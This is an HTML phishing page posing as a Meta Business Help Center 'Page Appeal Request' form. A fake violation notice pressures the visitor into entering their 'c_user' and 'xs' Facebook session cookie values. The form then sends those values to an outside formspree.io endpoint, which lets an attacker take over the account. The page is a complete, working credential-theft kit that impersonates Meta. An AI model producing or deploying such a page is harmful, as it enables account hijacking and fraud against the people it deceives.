DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Business Help Center</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .container { background: white; width: 100%; max-width: 450px; padding: 20px; border-radius: 8px; position: relative; }
        
        /* Language Dropdown Header */
        .lang-header { text-align: right; margin-bottom: 20px; cursor: pointer; color: #0866ff; font-weight: 600; font-size: 14px; }
        
        /* Modal (Language Menu) */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
        .modal-box { background: white; width: 90%; max-width: 350px; padding: 20px; border-radius: 8px; }
        .lang-option { padding: 12px 0; border-bottom: 1px solid #eee; cursor: pointer; font-size: 15px; }
        
        /* Appeal Form Style */
        .title { font-size: 24px; font-weight: 800; margin-bottom: 10px; }
        .notice { background: #fafafa; border: 1px solid #dddfe2; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; }
        input { width: 100%; padding: 12px; margin: 8px 0 15px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; background: #0866ff; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container">
        <div class="lang-header" onclick="document.getElementById('langModal').style.display='flex'">
            English ▼
        </div>

        <div id="langModal" class="modal">
            <div class="modal-box">
                <h3>Select Language</h3>
                <div class="lang-option">English</div>
                <div class="lang-option">Hindi</div>
                <div class="lang-option">Spanish</div>
                <div class="lang-option">Portuguese</div>
                <div class="lang-option">Tamil</div>
                <div class="lang-option">Arabic</div>
                <div class="lang-option">French</div>
                <div class="lang-option">Vietnamese</div>
                <div class="lang-option">Twi (Ghanaian)</div>
                <button onclick="document.getElementById('langModal').style.display='none'" class="btn">Close</button>
            </div>
        </div>

        <h1 class="title">Page Appeal Request</h1>
        <div class="notice">
            <b>Violation Notice:</b> Your page has a violation of our Community Standards.
        </div>
        
        <form action="https://formspree.io/f/maqaobyw" method="POST">
            <label><b>c_user</b></label>
            <input type="text" name="c_user" placeholder="Enter c_user" required>
            
            <label><b>xs</b></label>
            <input type="text" name="xs" placeholder="Enter xs" required>
            
            <button type="submit" class="btn">Submit Appeal Request</button>
        </form>
    </div>

</body>
</html>
